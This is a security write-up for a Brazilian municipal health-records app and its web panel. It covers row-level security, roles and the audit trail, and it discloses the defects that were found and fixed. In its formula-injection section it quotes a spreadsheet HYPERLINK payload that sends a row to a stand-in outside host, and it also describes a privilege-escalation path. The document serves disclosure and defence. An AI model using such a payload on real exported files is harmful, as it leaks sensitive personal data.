# Security

*[Versão em português](../seguranca.md)*

The system stores name, CPF (Brazilian taxpayer number), national health card number, address,
health conditions, medication, pregnancy and child data, and reports of domestic violence and
neglect. It is **sensitive personal data** as defined in article 5, II of Brazil's LGPD, and it is
meant for use by a municipal health department.

This document describes the model and records the defects found and fixed, because knowing where
the system has already failed is more useful than a list of good practices.

---

## The model, in one sentence

Who may read and write what is decided by the **database**, through Row Level Security. The app and
the panel are not the security boundary: both talk to the server with Supabase's public key, which
is public by design and ships inside the published bundle.

That has a consequence that drives everything else: **any access rule the client could bypass is not
an access rule.** Validation on screen is there so people do not make mistakes, not to stop someone
breaking in.

---

## The layers

### 1. Identity

| Where | How |
|---|---|
| App, offline use | local authentication in SQLite, salted hash via `expo-crypto` |
| App, sync | Supabase Auth session, opened at login when there is a connection |
| Web panel | Supabase Auth session, via cookie, refreshed by the middleware |

The app authenticates twice on purpose. Local authentication is what allows working offline, which
is the reason the system exists. The Supabase session is what allows writing to the server, because
the policies decide by `auth.uid()`.

Without a session, sync **stops before trying** and says so. That is not elegance: the queue counts
attempts and marks an item as a permanent error after five. Running without a session, five cycles
would turn a whole day's collection into permanent errors for a reason unrelated to the data.

### 2. Authorisation

Four roles, the same across the system and in the CHECK on `agentes.role`:

| Role | Scope |
|---|---|
| `agente` | their own patients |
| `coordenador` | their own health unit |
| `gerente` | everything, plus the audit trail |
| `admin` | everything, plus user management |

The policies use helper functions (`agente_papel()`, `agente_unidade()`, `pode_ler_prontuario()`)
declared `SECURITY DEFINER` with a locked `search_path`. That breaks the recursion of a policy that
needs to query another RLS-protected table.

Screen guards mirror the policies **on purpose**, and a test checks it (`contratoPapeis.test.ts`). A
guard that does not match the policy produces the worst kind of error: the page opens empty, and the
user concludes there is no data instead of no permission.

### 3. Data at rest

- Passwords: salted hash, constant-time comparison.
- Identification fields on the device: **plain text in SQLite**. The `utils/encryption.ts` module had
  `encryptField` and `encryptSensitiveFields`, but no line of the app called them. Documenting this
  as encrypted was false, and a false statement about protecting sensitive data is worse than the
  gap. What protects the file today is Android's own disk encryption, on since Android 10 and
  effective while the device is locked.

  Switching on the written cipher would **not** fix it: it was SHA-256 in counter mode without a MAC,
  hand-made because `expo-crypto` does not expose AES, and an unauthenticated stream cipher is
  malleable. Encrypting `nome` and `cpf` would also break local search, which is what the agent uses
  in the field. The real fix is SQLCipher, encrypting the whole database: it keeps search inside the
  app and is real AEAD. It costs a native dependency and a development build, the same constraint as
  background sync.
- Encryption key and session token: SecureStore (Keychain on iOS, Keystore on Android).
- `senha_hash` is unreadable by the client: the `GRANT` on `agentes` is column by column, and that
  column is left out.
- Deletion is logical (`deleted_at`), not physical.

It is worth knowing **why the GRANT is column by column**: `REVOKE SELECT (column)` has no effect
when there is a `GRANT` on the whole table. What works is revoking the table and granting the allowed
columns one by one.

### 4. Audit trail

`audit_log` is append-only on the server: it has INSERT and SELECT policies, and `REVOKE UPDATE,
DELETE` on top, so not even the `authenticated` role can try to change an audit row. Reading is
restricted to managers and admins.

---

## Defects found and fixed

Each one was reproduced on a PostgreSQL with the real schema, migrations and policies, before and
after the fix. The error message quoted is the one the database returned.

### Seven tables without Row Level Security

`agentes`, `audit_log` and the five `prontuario_*` tables had no RLS. With the public key, anyone
read and wrote health records, CPFs and password hashes.

Measured before the fix: a visitor without login read 2 health records and 4 agents with CPF; one
agent read another's patient; a coordinator read another unit.

Fixed with RLS and policies on every table, plus column-level `GRANT`s on `agentes`. Suite:
`rodar-testes-rls.sh`, 22 checks.

### Privilege escalation in sign-up approval

The `aprovarSolicitacao` and `rejeitarSolicitacao` Server Actions received the approver's id **as a
parameter**, trusted it, and used the service client, which bypasses RLS. There was no session or
role check.

The path was direct and needed no credentials: fill in the public sign-up choosing the "gerente"
role, call `aprovarSolicitacao` with your own request id and any uuid as approver, and receive a
manager account. Rate limiting did not help, because it counted by a value the attacker chose.

Fixed: identity comes from the session cookie, the parameter was removed from the signature, and the
role is checked with the same rule as the audit policy. Twelve tests, checked against the vulnerable
code.

### Published administrator password

The password of the administrator created on first run was the constant `Admin@2025`, written in the
repository, in a README table and printed on the app's settings screen. The repository is public.

Fixed: generated by `sortearSenhaForte`, stored in SecureStore, shown once and deletable.

### Formula injection in spreadsheets

Report export escaped commas, quotes and line breaks, but not a leading `=`. Excel and LibreOffice
execute cells starting with `=`, `+`, `-`, `@`, tab or carriage return, and visit notes are free text
typed in the field.

A cell with `=HYPERLINK("http://fora.example/"&A1,"clique")` would exfiltrate the row when someone at
the health department opened the file. Fixed in the app and the panel with an apostrophe prefix,
which spreadsheets treat as text.

### Critical framework vulnerability

Next.js 15.5.20 had two critical unauthenticated RCEs, one specific to Windows servers. Upgraded to
15.5.27, which closes the line's twelve advisories. The app's `axios` had twelve advisories, among
them SSRF via redirect; upgraded to 1.20.0.

CI gained a gate: `npm audit --omit=dev` must stay at zero on the panel, and no criticals on the app.

### The audited read could be bypassed

`fn_ler_morador` records who opened a record, but the `moradores` table had full `SELECT` for
`authenticated`. Any signed-in user asked PostgREST directly for `cpf`, `cartao_sus` or `doencas` and
read them without a trace, and the panel's own family screen did that with `moradores(*)`.

Fixed on 28/10/2026 with column-level `GRANT`s, as for `agentes.senha_hash`. Lists read name, age and
markers; the rest only comes out through the audited function. Document search became
`fn_buscar_morador_por_documento`: exact match, so it cannot serve as a prefix oracle, logged without
storing the document.

The database test found a side effect before production: Postgres requires reading the columns an
`INSERT ... ON CONFLICT DO UPDATE` updates, and the app synced residents with upsert. The message was
`permission denied for table moradores`. The app now writes with INSERT and, on retry, UPDATE by id.
Suite: `rodar-testes-colunas.sh`.

### Deactivated accounts kept access

`agentes.ativo` was not checked by any policy. Deactivating an agent removed them from lists, and the
open session kept reading records. Fixed with one `RESTRICTIVE` policy per data table, which Postgres
combines with AND with the existing policies without rewriting them.

### Dashboard functions failed open

The six indicator functions are `SECURITY DEFINER` and chose their scope by the caller's role. A null
role, from someone without login or without an account, matched no `IF` and fell into the manager
branch: four of them returned whole-city numbers and agent names to anyone with just the public key.
They also lacked a locked `search_path`. They now refuse without an active account, lock the
`search_path` and cannot be executed by `anon`. Suite: `07-conta-ativa.sql`, inside
`rodar-testes-colunas.sh`.

### Published panel without a database and without the fixes

On 29/10/2026 the production panel was still serving the May version. The Vercel project had been
deployed by hand and was not linked to the repository, so no merge reached production, and the
environment variables held example values: `/api/health` answered `misconfigured`. None of the fixes
in this document applied to anyone opening the site, and DAST was assessing the old code.

Fixed: the project was linked to the repository with the `produção` branch and the `ConectAgente-web`
folder, and the variables received real values, with the service key stored as a secret.
`/api/health` now answers `healthy`.

### Injected styles allowed by the content security policy

`style-src` had `'unsafe-inline'` because `globals.css` imported the font from Google on top of
`next/font`. So an injected `<style>` went through, and CSS attribute selectors leak on-screen field
values, one character per request. The import also sent every visitor's IP to Google.

Fixed on 29/10/2026: the font comes only from `next/font`, served by the site itself; `style-src`
only accepts the request nonce; `style=""` attributes remain allowed through `style-src-attr`,
because the components and charts render styles that way. Checked in Chromium with no violations on
`/login`, `/registro` and `/demo`. `Cross-Origin-Embedder-Policy: credentialless`,
`Cross-Origin-Opener-Policy` and `Cross-Origin-Resource-Policy` were added too.

## Still open

- **Medical record tables can still be read directly through the API**, within RLS and without
  logging. The fix is the same as for `moradores`: column-level reads, an audited function and
  replacing the app's upsert on those tables.
- **`braces`, `sprintf-js` and `node-forge` remain vulnerable** with no fixed version published by
  the maintainer. They are build tools and do not ship in the delivered bundle. `image-size` 2.x and
  `uuid` 11.x would fix two advisories but break Metro bundling, and that was measured:
  `TypeError: The "list" argument must be an instance of SharedArrayBuffer`.
- **Rate limiting is in process memory.** Fine for one server; with more than one instance, each
  counts separately.
- **There is no second factor** for the panel, where everyone's records are read.

---

## Reporting a flaw

See the [security policy](security-policy.md).
